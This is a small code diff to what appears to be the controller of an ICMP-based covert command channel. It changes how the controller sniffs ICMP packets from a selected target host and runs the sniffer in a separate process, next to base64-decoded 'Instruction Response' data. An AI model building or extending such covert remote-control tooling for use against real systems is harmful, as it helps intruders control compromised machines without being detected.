@@ -10,6 +10,7 @@ import os
 import sys
 import time
 import argparse
+from multiprocessing import Process
 
 TTL = int(64)
 ICMP_ID = int(12800)
@@ -36,15 +37,15 @@ class Controller(Host):
         
         return response
 
-    def sniffer(self):
-        sniff(iface=self.interface, prn=shell, filter="icmp", store="0")
+    def sniffing(self, target_ip):
+        sniff(iface=self.interface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")
 
     def interact(self, target):
         Target = Query()
-        target = self.db.search(Target.id == target)
-        print(target)
+        target = self.db.search(Target.id == target)[0]
 
-        # self.sniffing.start()
+        sniffer = Process(target=self.sniffing, args=(target['ip'],))
+        sniffer.start()
         # print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
 
     
